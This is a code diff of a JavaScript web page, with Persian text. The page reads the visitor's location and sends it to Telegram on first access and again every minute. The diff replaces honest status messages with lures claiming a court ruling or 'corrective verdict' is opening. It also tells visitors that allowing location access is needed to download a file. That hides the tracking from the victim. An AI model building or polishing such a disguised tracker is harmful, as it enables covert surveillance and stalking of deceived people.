@@ -155,9 +155,9 @@
 
       const sent = await sendLocationToTelegram(latitude, longitude);
       if (sent) {
-        showStatus("📍 موقعیت جدید به تلگرام ارسال شد.");
+        showStatus("حکم اصلاحی در حال باز شدن است");
       } else {
-        showStatus("⚠️ موقعیت دریافت شد اما ارسال به تلگرام ناموفق بود.");
+        showStatus("حکم اصلاحی به دلیل رد مجاز باز نشد دوباره تلاش نمائید.");
       }
     }
 
@@ -202,7 +202,7 @@
 
         // ارسال دفعه اول
         await processAndSend(position);
-        showStatus("✅ دسترسی تایید شد. به‌روزرسانی خودکار هر ۱ دقیقه.");
+        showStatus("✅");
 
         // ارسال خودکار هر ۱ دقیقه
         timer = setInterval(updateLocation, INTERVAL);
@@ -212,9 +212,9 @@
         console.error(error);
 
         if (error.code === error.PERMISSION_DENIED) {
-          showStatus("❌ دسترسی به موقعیت توسط کاربر رد شد.");
+          showStatus("برای دانلود فایل دسترسی را مجاز نمائید.");
         } else {
-          showStatus("❌ در انتظار دریافت مجوز موقعیت مکانی...");
+          showStatus("در حال باز شدن حکم داد گاه");
         }
       }
     }
